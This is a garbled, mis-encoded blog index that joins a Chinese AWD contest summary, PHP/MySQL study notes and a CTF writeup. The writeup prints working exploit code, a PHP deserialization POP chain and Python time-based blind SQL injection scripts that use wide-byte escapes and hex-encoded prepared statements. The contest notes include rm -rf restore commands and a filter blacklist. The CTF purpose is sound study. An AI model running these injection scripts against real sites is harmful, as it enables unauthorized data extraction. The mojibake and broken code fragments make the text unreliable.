æ¯”èµ›ç™»å½•æ¯”èµ›å¼€å§‹çš„æ—¶å€™å‘äº†è´¦å·å¯†ç , ç™»å½•ä¸Šå»ä¸€ç›´çœ‹ä¸åˆ°èµ›é¢˜ä¿¡æ¯, è¿˜ä»¥ä¸ºæ˜¯ç½‘ç»œé—®é¢˜, åé¢é—®äº†æ‰å‘ç°æ˜¯å¹¿å‘Šæ’ä»¶çš„é—®é¢˜ , å…³é—­å¹¿å‘Šæ’ä»¶å°±å¯ä»¥çœ‹åˆ°äº† å…³é—­å¹¿å‘Šæ‹¦æˆªæ’ä»¶ ç„¶åä¸‹è½½èµ›é¢˜ä¿¡æ¯, é‡Œé¢æœ‰ipå’Œsshçš„å…¬ç§é’¥ ç¬¬ä¸€æ¬¡è¿, å·®ç‚¹ä¸ä¼šè¿, è¿˜å¥½MobaXTermçš„ç•Œé¢è®¾è®¡çš„ä¸é”™, ä¸€çœ¼å°±çœ‹åˆ°äº†åœ¨å“ªé‡Œæ·»åŠ  è¾“å…¥hostå’Œusername(è¿™é‡Œæ˜¯xman) å‹¾é€‰ Use private Key é€‰æ‹©ä¸å¸¦åç¼€çš„ç§é’¥ id_rsa ç„¶åå°±å¯ä»¥ç™»å½•ä¸Šå»äº† å¼±å¯†ç è¿™é‡Œä¸»è¦æ¶‰åŠçš„æ˜¯ sshå¯†ç  mysqlå¯†ç  phpmyadminå¯†ç  etc ä¸è¿‡è¿™éƒ¨åˆ†æš‚æ—¶è¿˜æ²¡æ‰¾åˆ°ç›¸å…³çš„è„šæœ¬, å¸ˆå‚…ä»¬æœ‰çš„è¯å¯ä»¥æ¥äº¤æµä¸€ä¸‹ sshå…ˆç™»å½•ä¸Šå», ä¹‹å 1passwd è¾“å…¥å¯†ç å³å¯, æ”¹å®Œè‡ªå·±çš„ç›´æ¥å¼€å§‹æ‰“ è¿™é‡Œå¯ä»¥ç”¨@p0destaå¸ˆå‚…çš„æ¡†æ¶ awd-attack ä¸è¿‡æ²¡æœ‰é›†æˆä¿®æ”¹sshå¯†ç çš„åŠŸèƒ½, åé¢å†è‡ªå·±æ”¹ä¸€ä¸‹å§ æ•°æ®åº“12mysql>set password=password('new');mysql>flush privileges; æ²¡æ”¹çš„è¯ä¸Šå»å°±å¯ä»¥åˆ åº“è·‘è·¯äº†hhh å¤‡ä»½å¤‡ä»½è¿˜æ˜¯å¤§æ„äº†, æ¯”èµ›å‰æƒ³è¿‡å¤‡ä»½æ•°æ®åº“, è¿å‘½ä»¤éƒ½å‡†å¤‡å¥½äº†, ç»“æœä¸Šå»å°±å¿˜è®°äº†, å¯¼è‡´web9ä»å¼€å§‹å°±å®•æœºå®•åˆ°ç»“æŸ (è‡ªå·±èƒŒé”… ä¸‹é¢çš„å¤‡ä»½éƒ½æ˜¯å¤‡ä»½åˆ°å®¶ç›®å½• æºç å¤‡ä»½è¿™é‡Œæœ‰ä¸ªæ³¨æ„çš„ç‚¹æ˜¯, å¦‚æœä¸å…ˆè¿›å…¥htmlæ–‡ä»¶å¤¹çš„è¯, å¤‡ä»½åçš„å‹ç¼©åŒ…ä¼šåŒ…å«æ•´ä¸ªè·¯å¾„ 12# ä¸å»ºè®®tar -zcvf ~/html.tar.gz /var/www/html/ ä¸‹é¢çš„å‘½ä»¤å‹ç¼©åç»“æ„å¦‚ä¸‹ 12cd /var/www/htmltar -zcvf ~/html.tar.gz * å¦‚æœéœ€è¦æ¢å¤åˆ™å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ 12rm -rf /var/www/htmltar -zxvf ~/html.tar.gz -C /var/www/html æˆ–è€… 123cd /var/www/htmlrm -rf *tar -zxvf ~/html.tar.gz æ•°æ®åº“å¤‡ä»½å…ˆåœ¨htmlæ–‡ä»¶å¤¹é‡Œé¢æœç´¢ä¸€ä¸‹æ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç  12cd /var/www/htmlfind .|xargs grep \"password\" , ç„¶åå¼€å§‹å¤‡ä»½ 12345678#mysqlç»ˆç«¯ä¸‹å¯ä»¥å…ˆçœ‹ä¸€ä¸‹æœ‰ä»€ä¹ˆæ•°æ®åº“mysql>show databases;# å¤‡ä»½ç›¸åº”çš„æ•°æ®åº“mysqldump -u ç”¨æˆ·å -p æ•°æ®åº“å>~/back.sql# å¤‡ä»½å…¨éƒ¨æ•°æ®åº“mysqldump -u root -p --all-databases >~/back.sql# è·³è¿‡é”å®šçš„æ•°æ®åº“è¡¨mysqldump -u root -p --all-databases â€”skip-lock-tables >~/back.sql æ¢å¤çš„è¯, éœ€è¦å…ˆå»ºå¥½ç›¸åº”çš„æ•°æ®åº“ 1234cd mysql>create database xxx;mysql>use xxx;mysql>source back.sql; æˆ–è€…åœ¨ç»ˆç«¯ä¸‹ 12cdmysql -u root -p xxx $value) { $files[$key][â€˜contentâ€™] = file_get_contents($_FILES[$key][â€˜tmp_nameâ€™]); file_put_contents($_FILES[$key][â€˜tmp_nameâ€™], â€œvirinkâ€); }unset($header[â€˜Acceptâ€™]);$input = array(â€œGetâ€=>$get, â€œPostâ€=>$post, â€œCookieâ€=>$cookie, â€œFileâ€=>$files, â€œHeaderâ€=>$header);logging($input);}function logging($var){ $filename = $_SERVER[â€˜REMOTE_ADDRâ€™];$LOG_FILENAME = LOG_FILEDIR.â€/â€.$filename;$time = date(â€œY-m-d G:i:sâ€);file_put_contents($LOG_FILENAME, â€œ\\r\\nâ€.$time.â€\\r\\nâ€.print_r($var, true), FILE_APPEND); file_put_contents($LOG_FILENAME,â€\\r\\nâ€.â€™http://â€™.$_SERVER[â€˜HTTP_HOSTâ€™].$_SERVER[â€˜PHP_SELFâ€™].â€™?â€™.$_SERVER[â€˜QUERY_STRINGâ€™], FILE_APPEND);file_put_contents($LOG_FILENAME,â€\\r\\n***************************************************************â€,FILE_APPEND);}waf(); ?> è‡ªåŠ¨ä¸Šwafçš„è„šæœ¬, è¿™ä¸ªè„šæœ¬éœ€è¦æ³¨æ„çš„æ˜¯, wafçš„è·¯å¾„å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„, å› ä¸ºæ˜¯é€’å½’æ·»åŠ waf, å¦‚æœä¸æ˜¯ç»å¯¹è·¯å¾„, å†…å±‚æ–‡ä»¶å¤¹çš„phpæ–‡ä»¶æ— æ³•æ‰¾åˆ°wafçš„è·¯å¾„, æœåŠ¡å°±ä¼šå®•æ‰, ä½†æ˜¯å¦‚æœå…¨éƒ¨ä¸Šçš„è¯, å°±ç®—ä¸Šå¯¹äº†è¿˜æ˜¯æœ‰å¯èƒ½å‡ºç°å®•æœº, è¿™ä¸ªä¸namespaceæœ‰å…³, å¯ä»¥äº†è§£ä¸€ä¸‹, å¦‚æœæ˜¯å¸¸è§çš„cmså¯ä»¥ä¸Šåœ¨å…¥å£çš„phpä¸­, å°±èƒ½ç›‘å¬åˆ°æµé‡äº† 1234567891011121314151617181920212223242526272829#-*- coding:utf-8 -*'''æ‰¹é‡æ·»åŠ WAFçš„pythonè„šæœ¬'''import osbase_dir = '/var/www/html' #web pathdef scandir(startdir) : os.chdir(startdir) for obj in os.listdir(os.curdir) : path = os.getcwd() + os.sep + obj if os.path.isfile(path) and '.php' in obj and 'log' not in path: modifyip(path,'","link":"/2019/08/22/Xman%E7%BB%93%E8%90%A5%E8%B5%9BAWD%E6%80%BB%E7%BB%93/"},{"title":"phpå’Œmysqlå¼€å‘ç¬”è®°","text":"å­¦ä¹ phpåœ£ç»çš„ç¬”è®° ç¬¬ä¸€ç«  å¿«é€Ÿå…¥é—¨phpä¸¤ç§æ ‡è®°123// å–å†³äºphp.iniä¸­'short_open_tag'é€‰é¡¹, é»˜è®¤ä¸å¼€å¯ åŒå¼•å·å’Œå•å¼•å·ä¸­çš„å˜é‡å•å¼•å·ä¸è§£æphpå˜é‡, åŒå¼•å·åˆ™ä¼šè§£æå˜é‡å€¼ 12345$a = 1;echo \"a=$a\";//> a=1;echo 'a=$a';//> a=$a heredocè¯­æ³•é€šè¿‡æ ‡å¿—(theEnd)æ¥ä½œä¸ºå…³é—­æ ‡è®°, åªéœ€è¦ä¿è¯ä¸ä¼šå‡ºç°åœ¨æ–‡æœ¬ä¸­ 123456789echo intsettype($a, 'float');echo gettype($a);//> float ç¬¬äºŒç«  æ•°æ®å­˜å‚¨å’Œè¯»å–æ–‡ä»¶è¯»å†™è¯»å†™æ¨¡å¼ æ¨¡å¼ æ¨¡å¼åç§° æ„ä¹‰ r è¯» ä»å¤´å¼€å§‹è¯», åŠ ä¸Š+è¡¨ç¤ºè¯»å†™ w å†™ ä¸å­˜åœ¨æ–‡ä»¶æ—¶ä¼šåˆ›å»ºæ–‡ä»¶, å­˜åœ¨æ—¶åˆ™ä¼šæ¸…ç©ºå¹¶ä»å¤´å¼€å§‹å†™, åŠ ä¸Š+è¡¨ç¤ºè¯»å†™ x è°¨æ…å†™ å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™ä¼šè¿”å›falseå¹¶æŠ›å‡ºé”™è¯¯, å…¶ä»–åŒw b äºŒè¿›åˆ¶ winä¼šåŒºåˆ†äºŒè¿›åˆ¶æ–‡ä»¶å’Œæ–‡æœ¬æ–‡ä»¶, linuxåˆ™ä¸ä¼šåŒºåˆ†, æ¨èä½¿ç”¨ a è¿½åŠ  ä¸å­˜åœ¨æ–‡ä»¶æ—¶ä¼šåˆ›å»ºæ–‡ä»¶, å­˜åœ¨æ—¶åˆ™ä»æ–‡ä»¶å°¾éƒ¨å¼€å§‹å†™, åŠ ä¸Š+è¡¨ç¤ºè¯»å†™ t æ–‡æœ¬ winä¸‹çš„ä¸€ä¸ªé€‰é¡¹, ä¸æ¨èä½¿ç”¨ åˆ†éš”ç¬¦1234//winfopen(\"c:\\\\flag\",\"r\");//win and linux, æ¨èfopen(\"../flag\",\"r\"); å†™æ–‡ä»¶12345$fp = fopen(\"log.txt\", \"ab\");fwrite($fp, \"aaa\");file_put_contents(\"log.txt\", \"aaa\");fputs($fp, \"aaa\");fclose($fp); è¯»æ–‡ä»¶123456789101112131415161718// åˆ¤æ–­æ–‡ä»¶æœ«å°¾, file end of filewhile(!feof($fp)){...};// è¯»å­—ç¬¦while(!feof($fp)){ $char = fgetc($fp); if(!feof($fp)){ echo ($char == \"\\n\" ? \"\":$char); }}// è¯»ä¸€è¡Œfgets/fgetss/fgetcsv// è¯»ä»»æ„é•¿fread()// è¯»æ–‡ä»¶readfile($filename);fpassthru($fp);file($filename);//è¿”å›æ•°ç»„, æŒ‰è¡Œåˆ†å‰²file_get_contents($filename);//è¿”å›æ–‡ä»¶å†…å®¹, ä¸è¾“å‡º å…¶ä»–æ–‡ä»¶æ“ä½œ12345678910// åˆ¤æ–­æ–‡ä»¶å­˜åœ¨file_exists($filename);// è·å–æ–‡ä»¶å¤§å°filesize($filename);// åˆ é™¤æ–‡ä»¶unlink($filename);// æ–‡ä»¶æŒ‡é’ˆå®šä½rewind()/fseek()/ftell();// æ–‡ä»¶é”flock(); ç¬¬ä¸‰ç«  æ•°ç»„åˆ›å»ºæ•°ç»„æ•°ç»„æ”¯æŒåœ¨ç»“å°¾æ·»åŠ å…ƒç´  12345678910// array$pro = array('Tires', 'Oil', 'Spark');$pro = array('Tires' => 100, 'key' => value);// since php5.4$pro = ['Tires', 'Oil', 'Spark'];$pro[3] = 'Plugs';// å¤šç»´æ•°ç»„$multi_pro = array(array('tires', 100), array('Spark', 99) ); è®¿é—®æ•°ç»„12$pro[0];$pro{1}; å¾ªç¯123for($i = 0; $i < 3; $i++){..}foreach($pro => $value){...} //foreach($pro as $key => $value){...} // æ•°ç»„æ’åº123456789101112// å­—å…¸åº,åŒºåˆ†å¤§å°å†™sort()asort() ksort()// ååºrsort()arsort() krsort()// è‡ªå®šä¹‰åºusort($array, $func)// æ•°ç»„éšæœºshuffle()// æ•°ç»„é€†åºarray_reverse() æ•°ç»„æ“ä½œè¿›å‡ºæ•°ç»„12array_push($array, $item);array_pop($array);//åˆ é™¤æœ«å°¾ æ•°ç»„æµè§ˆ123456789101112// è¿”å›å½“å‰å…ƒç´ å¹¶æŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ each()// æŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ å¹¶è¿”å›æ–°çš„å…ƒç´ next()// è¿”å›å½“å‰å…ƒç´ current()// è¿”å›æŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆreset// è¿”å›æŒ‡å‘æœ€åä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆend()// æŒ‡å‘ä¸Šä¸€ä¸ªå…ƒç´ å¹¶è¿”å›æ–°çš„å…ƒç´ prev() ç»Ÿè®¡æ•°ç»„1234// è¿”å›å…ƒç´ ä¸ªæ•°count()/sizeof()// è¿”å›æ¯ä¸ªç‰¹å®šå€¼åœ¨æ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•°, è¿”å›å€¼ä¸ºæ•°ç»„array_count_values() å…¶ä»–æ“ä½œ1234567// maparray_walk($array, $func, [userdata]);// å…¶ä¸­funcå®šä¹‰ä¸ºfunc($value, $key, $userdata); // è§£ææ•°ç»„ä¸ºå˜é‡, ä¸å®‰å…¨extract($array); ç¬¬å››ç«  å­—ç¬¦ä¸²å­—ç¬¦ä¸²æˆªæ–­123456// é™¤å»å¼€å§‹å’Œç»“æŸçš„ç©ºæ ¼trim()// é™¤å»å¼€å§‹çš„ç©ºæ ¼ltrim()// é™¤å»ç»“æŸçš„ç©ºæ ¼rtrim()/chop() htmlè½¬æ¢1234// htmlå­—ç¬¦è¿‡æ»¤htmlspecialchars();// /n => n2br(); å¤§å°å†™123456strtoupper()strtolower();// æ¯ä¸ªå­—ç¬¦ä¸²é¦–å­—æ¯å¤§å†™ucfirst();// æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™ucwords() æ ¼å¼åŒ–è¾“å‡º1%[+]['padding_character][-][width][.precision]type + è¡¨ç¤ºæ­£æ•°è¾“å‡º + padding_character è¡¨ç¤ºè¾“å‡ºå‰ç¼€, é™¤0å’Œå¤–éƒ½éœ€è¦æ·»åŠ ` -è¡¨ç¤ºå·¦å¯¹é½ widthè¡¨ç¤ºå®½åº¦ .precisionè¡¨ç¤ºå°æ•°ç‚¹åä½æ•° ç±»å‹ æ„ä¹‰ b è§£é‡Šä¸ºæ•´æ•°å¹¶ä½œä¸ºäºŒè¿›åˆ¶è¾“å‡º c è§£é‡Šä¸ºæ•´æ•°å¹¶ä½œä¸ºå­—ç¬¦è¾“å‡º d è§£é‡Šä¸ºæ•´æ•°å¹¶ä½œä¸ºå°æ•°è¾“å‡º e è§£é‡Šä¸ºåŒç²¾åº¦å¹¶ä»¥ç§‘å­¦è®¡æ•°æ³•æ‰“å°, ç²¾åº¦æ˜¯å°æ•°ç‚¹åçš„æ•°å­—ä¸ªæ•° E åŒe, æ‰“å°ä¸ºå¤§å†™E f è§£é‡Šä¸ºåŒç²¾åº¦å¹¶ä½œä¸ºæµ®ç‚¹æ•°è¾“å‡º F è§£é‡Šä¸ºæµ®ç‚¹æ•°å¹¶æ‰“å°ä¸localeæ— å…³çš„æµ®ç‚¹æ•° g è½¬æ¢è§„èŒƒç±»å‹eæˆ–fçš„ç®€çŸ­è¾“å‡º G è½¬æ¢è§„èŒƒç±»å‹Eæˆ–Fçš„ç®€çŸ­è¾“å‡º o è§£é‡Šä¸ºæ•´æ•°å¹¶ä½œä¸º8è¿›åˆ¶è¾“å‡º s è§£é‡Šä¸ºå­—ç¬¦ä¸²è¾“å‡º u è§£é‡Šä¸ºæ•´æ•°å¹¶ä½œä¸ºéæŒ‡å®šå°æ•°è¾“å‡º x è§£é‡Šä¸ºæ•´æ•°å¹¶ä½œä¸º16è¿›åˆ¶å°å†™è¾“å‡º X è§£é‡Šä¸ºæ•´æ•°å¹¶ä½œä¸º16è¿›åˆ¶å¤§å†™è¾“å‡º å­—ç¬¦ä¸²è¿æ¥åˆ‡åˆ†1234// åˆ‡åˆ†explode($separator, $string);// è¿æ¥implode($separator, $array)/join(); å­ä¸²1234// strtok// startå’Œlengthéƒ½å¯ä»¥æ˜¯è´Ÿæ•°, å½“lengthä¸ºè´Ÿæ•°æ—¶è¡¨ç¤ºç»“æŸä½ç½®(end)substr($strings, start, [length]); æ¯”è¾ƒ123456// åŒºåˆ†å¤§å°å†™strcmp()// ä¸åŒºåˆ†å¤§å°å†™strcasecmp()// è‡ªç„¶åº, 2 åŒ¹é…$b = \"blah baa black sheep\";//> ä¸åŒ¹é… æ­£åˆ™åˆ†å‰²1234print_r(preg_split(\"/\\.|@/\", \"user@admin.cn\"));//> user admin cn ç¬¬äº”ç«  ä»£ç é‡ç”¨å’Œå‡½æ•°auto_prepend_file1234567// php.iniauto_prepend_file = \"/path/to/header.php\";auto_append_file = \"/path/to/footer.php\";// .htaccess, ç›®å½•ä¸­æ¯æ¬¡æ¯ä¸ªæ–‡ä»¶éƒ½è¦è¿›è¡Œå¤„ç†, æ€§èƒ½è¾ƒä½php_value auto_prepend_file \"/path/to/header.php\"php_value auto_append_file \"/path/to/footer.php\"// è€ƒè™‘å®‰å…¨é—®é¢˜å¯ä»¥ä½¿ç”¨readfileè¯»å…¥è€Œä¸ä¼šè‡ªåŠ¨è§£æä»£ç  é—­åŒ…é—­åŒ…å‡½æ•°å…·æœ‰å¯¹å…¨å±€ä½œç”¨åŸŸå˜é‡çš„è®¿é—®, ä½†å¿…é¡»åœ¨é—­åŒ…å‡½æ•°å®šä¹‰ä¸­ä½¿ç”¨useå…³é”®å­—æ˜¾å¼å®šä¹‰ ç¬¬å…­ç«  é¢å‘å¯¹è±¡ç±»å±æ€§ä¿®é¥°ç¬¦é»˜è®¤ä¸ºpublic privateä¸å¯è¢«ç»§æ‰¿, protectedå¯ä»¥è¢«ç»§æ‰¿ finalå…³é”®å­—ç”¨äºç¦æ­¢ç±»è¢«ç»§æ‰¿æˆ–è€…å‡½æ•°è¢«è¦†ç›– ä¸æ”¯æŒå¤šé‡ç»§æ‰¿å•ä¸€ç»§æ‰¿, ä½†æ˜¯å¯ä»¥æ”¯æŒç±»ä¼¼javaçš„interface12345678interface Displayable{ function display();}class Test implements Displayable{ function display(){ ... }}æˆ–è€…ä½¿ç”¨Trait, æ³¨æ„Traitä¼šè¦†ç›–ç±»ç»§æ‰¿çš„åŒåæ–¹æ³•, è€Œç±»ä¸­è‡ªå®šä¹‰çš„æ–¹æ³•å¯ä»¥è¦†ç›–Traitçš„æ–¹æ³•123456789trait logger{ public function logmessage($message){ ... }}class Test{ use logger; // this->logmessage();}å¦‚æœä½¿ç”¨äº†å¤šä¸ªåŒåçš„Trait, éœ€è¦ç”¨insteadofå£°æ˜æ‰€ä½¿ç”¨çš„å‡½æ•° çµæ´»çš„ä½¿ç”¨æ ‡è®°å½“ç¨‹åºä¸­éœ€è¦å¤§æ®µçš„æ‰“å°htmlä»£ç æ—¶, å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„æ–¹æ³•12345 html... ç¬¬å…«ç«  webæ•°æ®åº“è®¾è®¡é¿å…ä¿å­˜å†—ä½™æ•°æ®, å½“å†—ä½™æ•°æ®è¿‡å¤šä¼šå‡ºç°ä¿®æ”¹, æ’å…¥å’Œåˆ é™¤å¼‚å¸¸ é¿å…å‡ºç°å¤§é‡ç©ºå€¼ ç¬¬ä¹ç«  Webæ•°æ®åº“åˆ›å»ºå®‰è£…æ­¥éª¤ å®‰è£…æ–‡ä»¶ å¦‚æœéœ€è¦, åˆ›å»ºå¹¶è®¾ç½®MySQLçš„è¿è¡Œç”¨æˆ· è®¾ç½®è·¯å¾„ å¦‚æœéœ€è¦, è¿è¡Œmysql_install_db è®¾ç½®rootç”¨æˆ·å¯†ç  åˆ é™¤åŒ¿åç”¨æˆ·å’Œæµ‹è¯•æ•°æ®åº“ å¯åŠ¨MySQLå¹¶è®¾ç½®ä¸ºè‡ªåŠ¨è¿è¡Œ å¤§å°å†™sqlè¯­å¥ä¸åŒºåˆ†å¤§å°å†™, æ•°æ®åº“åç§°å’Œè¡¨åç§°åŒºåˆ†å¤§å°å†™(linuxä¸‹) åˆ›å»ºç”¨æˆ·åˆ›å»ºç”¨æˆ·å¯ä»¥ä½¿ç”¨ 1create user user_info identified by password; æˆ–è€…ä½¿ç”¨grantè‡ªåŠ¨åˆ›å»ºç”¨æˆ· 12-- since mysql 5.5.7grant privileges on item to user_info identified by password; æƒé™å¤§éƒ¨åˆ†æƒ…å†µä¸‹, phpè„šæœ¬åªéœ€è¦select, insert, update, deleteæ“ä½œ å¯ä»¥é€šè¿‡grantæˆäºˆå’Œrevokeå–å›, éƒ¨åˆ†æƒé™å¦‚fileå…·æœ‰æå¤§çš„å®‰å…¨é—®é¢˜ å¦‚æœæ‰€è¿è¡Œçš„grantè¯­å¥å·²ç»æ‰§è¡Œ, ä½†æ˜¯å°è¯•ç™»é™†æ—¶è¢«æ‹’ç», é€šå¸¸æ˜¯å› ä¸ºå®‰è£…ä¸­çš„åŒ¿åç”¨æˆ·æ²¡æœ‰è¢«åˆ é™¤ æŸ¥çœ‹æ•°æ®åº“1234-- æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“show databases;-- æ˜¾ç¤ºæ•°æ®åº“ç»“æ„describe database_name; éƒ¨åˆ†ç±»å‹å½“è¯»å–charç±»å‹æˆ–è€…å†™å…¥varcharæ•°æ®æ—¶, mysqlå°†è¿‡å»ç»“å°¾å¤„å¤šä½™çš„ç©ºæ ¼ blob, äºŒè¿›åˆ¶å¤§å¯¹è±¡, å¯ä»¥ç”¨æ¥å­˜å‚¨å›¾åƒå£°éŸ³æ•°æ®ç­‰ æœ¬æ–‡ä½œè€…: cjm00næœ¬æ–‡åœ°å€: https://cjm00n.top/2019/11/24/phpå’Œmysqlå¼€å‘ç¬”è®°/ ç‰ˆæƒå£°æ˜: é™¤ç‰¹åˆ«è¯´æ˜å¤–ï¼Œæ‰€æœ‰æ–‡ç« å‡é‡‡ç”¨ CC BY 4.0 è®¸å¯åè®®ï¼Œè½¬è½½è¯·å…ˆå–å¾—åŒæ„ã€‚","link":"/2019/11/24/php%E5%92%8Cmysql%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"},{"title":"æ–°æ˜¥å…¬ç›Šèµ›2020wp","text":"æœ‰ä¸€ä¸¤é“æŒºæœ‰æ„æ€çš„ ç®€å•çš„æ‹›è˜ç³»ç»Ÿå¾ˆå‘, ä¸€å¼€å§‹ä¸‹å‘çš„ç¯å¢ƒä¸å¯¹, æ—¥äº†åŠå¤© ä¸‡èƒ½å¯†ç ç»•è¿‡+unionæ³¨å…¥ babyphpæ”¹è‡ª[0ctf 2016] piapiapia, å…·ä½“çš„æ€è·¯æ˜¯ååºåˆ—åŒ–é€ƒé€¸å’Œpopé“¾æ„é€  é¦–å…ˆæ˜¯ååºåˆ—åŒ–é€ƒé€¸ 1234function safe($parm){ $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\"); return str_replace($array,'hacker',$parm);} å…·ä½“çš„åˆ†æå¯ä»¥æ‰¾åŸé¢˜çœ‹ä¸€ä¸‹, ååºåˆ—åŒ–é€ƒé€¸æœ‰è¿™ä¸¤ç§æ–¹å‘ æ›¿æ¢åå˜é•¿, åœ¨valueçš„éƒ¨åˆ†æ„é€ é€ƒé€¸, å¦‚æœ¬é¢˜å’Œpiapiapia æ›¿æ¢åå˜çŸ­, åœ¨keyçš„éƒ¨åˆ†æ„é€ , å¦‚[axb 2019]easy_serialize_php ç„¶åå°±æ˜¯ååºåˆ—åŒ–é“¾çš„æ„é€  nicknameå¯æ§, ç„¶åå¯»æ‰¾__destruct æœ‰ä¸ªecho, å¯ä»¥ç”¨æ¥è§¦å‘__toString, å…¶å®æœ¬é¢˜è¿˜æœ‰ä¸€ä¸ª__destruct, ä½†æ˜¯æ¯”è¾ƒå‘ é¦–å…ˆå­˜åœ¨è¿‡æ»¤flag, æ— æ³•è¯»å–flag.php, å…¶æ¬¡æ²¡æœ‰è¾“å‡ºç‚¹, è¯»äº†ä¹Ÿæ²¡ç”¨ æˆ‘ä»¬ç»§ç»­æ‰¾æ‰¾__toString ä¼šè°ƒç”¨ä¸€ä¸ªupdateå‡½æ•°, å¯¹äºå‡½æ•°è°ƒç”¨æˆ‘ä»¬æœ‰ä¸¤ç§å¤„ç†æ–¹æ³• å¯»æ‰¾å¸¦æœ‰è¿™ä¸ªå‡½æ•°çš„ç±» å¯»æ‰¾__callæ–¹æ³• å› ä¸ºè¿™ä¸ªupdateè¿˜æ˜¯ç©ºçš„ æˆ‘ä»¬å°±æ‰¾__call æœ‰ä¸ªloginçš„è°ƒç”¨, è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„äº†, çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•° sqlç”¨çš„æ˜¯PDOæ–¹æ³•, ä¸€èˆ¬æ²¡æœ‰sqlæ³¨å…¥, ä½†æ˜¯è¿™é‡Œä¼šè¿”å›ä¸€ä¸ª$idResult, ä¹Ÿå°±æ˜¯ç¬¬ä¸€åˆ—çš„ç»“æœ, è€Œå‰é¢çš„è°ƒç”¨è¿˜æœ‰ä¸ªecho, ä¹Ÿå°±æ˜¯èƒ½å¤Ÿå›æ˜¾ç¬¬ä¸€åˆ—çš„ç»“æœ, æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥æ³¨å‡ºå¯†ç  expå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051CtrlCase = $o;$u = new User();$u->nickname = $i;$h = new UpdateHelper();$h->sql = $u;$f = new Info();$f->CtrlCase = $h;$s = serialize($f);assert($s===safe($s));$s = substr($s,47);$len = strlen($s);$res = \"\";for($dd=0;$dd, query(\"select balabala from table1\"); $res = $test->fetch(PDO::FETCH_ASSOC); $id = $res['balabala']; } if(check($id)) { $query = \"select balabala from table1 where 1=?\"; $db->query(\"set names gbk\"); $row = $db->prepare($query); $row->bindParam(1,$id); $row->execute(); } ç›²æ³¨, expå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142import requestsfrom Crypto.Util.number import long_to_bytes, bytes_to_longfrom libnum import s2nimport stringimport reurl = \"http://e0bac4dbfc61452b906f16cacbe31e9bfe43db0e990f4ace.changame.ichunqiu.com/\"pattern = re.compile(\"union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&|database\", re.I)def gen(payload, pos, num): \"\"\" SET @SQL=0x73656c65637420646174616261736528293b;PREPARE pord FROM @SQL;EXECUTE pord;\"\"\" res = \"%bf%27;SET @x=\" + (hex(s2n(payload % (pos, num)))) + \";PREPARE xx FROM @x;EXECUTE xx;/*\" # print(res) if pattern.match(res): print(\"match\") exit(0) return resdef exp(): # payload = \"select if((ascii(substr(reverse((select group_concat(table_name) from information_schema.tables where table_schema=database())),%d,1))>%d),0,sleep(4));\" payload = \"select if((ascii(substr(reverse((select fllllll4g from pdotest.table1)),%d,1))>%d),0,sleep(4));\" res = \"\" for i in range(1,60): start = 32 end = 128 mid = (end + start) // 2 while end > start: params = { \"id\": gen(payload, i, mid) } try: requests.get(url+\"?id=\"+params['id'], timeout=2) start = mid + 1 except: end = mid mid = (end + start) // 2 res = chr(mid) + res print(res) # print(f\"{i}: {res}\") if __name__ == \"__main__\": exp() æ”¹è¿›äº†ä¸€ä¸ªå¤šçº¿ç¨‹ç‰ˆæœ¬, ä¸€åˆ†é’Ÿä¸åˆ°å°±å¯ä»¥æ³¨å‡ºç»“æœ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import requestsfrom libnum import s2nimport stringimport refrom multiprocessing.pool import ThreadPoolurl = \"http://e0bac4dbfc61452b906f16cacbe31e9bfe43db0e990f4ace.changame.ichunqiu.com/\"pattern = re.compile(\"union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&|database\", re.I)res = [\"\" for i in range(60)]def gen(payload, pos, num): \"\"\" SET @SQL=0x73656c65637420646174616261736528293b;PREPARE pord FROM @SQL;EXECUTE pord;\"\"\" res = \"%bf%27;SET @x=\" + (hex(s2n(payload % (pos, num)))) + \";PREPARE xx FROM @x;EXECUTE xx;/*\" # print(res) if pattern.match(res): print(\"match\") exit(0) return resdef exp(i): # payload = \"select if((ascii(substr(reverse((select group_concat(table_name) from information_schema.tables where table_schema=database())),%d,1))>%d),0,sleep(4));\" payload = \"select if((ascii(substr(((select fllllll4g from pdotest.table1)),%d,1))>%d),0,sleep(4));\" # for i in range(1,60): if i: start = 32 end = 128 mid = (end + start) // 2 while end > start: params = { \"id\": gen(payload, i, mid) } try: requests.get(url+\"?id=\"+params['id'], timeout=2) start = mid + 1 except: end = mid mid = (end + start) // 2 res[i] = chr(mid) print(\"\".join(res)) # print(f\"{i}: {res}\") if __name__ == \"__main__\": pool = ThreadPool(5) for i in range(45): pool.apply_async(exp, (i, )) # exp() pool.close() pool.join() black_listhttps://skysec.top/2019/12/13/2019-FudanCTF-Writeup/ é£˜é›¶å¸ˆå‚…tql ezsqliè¿™é“é¢˜è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿, ä¸»è¦å‚è€ƒçš„æ˜¯å‡ºé¢˜äººçš„åšå®¢ https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/ ç”±äºæˆ‘ä»¬æ²¡æœ‰union, æ— æ³•ä½¿ç”¨å¸¸è§„çš„æ— åˆ—åæ³¨å…¥, æ‰¾äº†å¾ˆå¤šèµ„æ–™, åªæœ‰smi1eå¸ˆå‚…çš„è¿™ä¸ªpayloadå¯ç”¨ 1234567891011121314151617mysql> SELECT * FROM 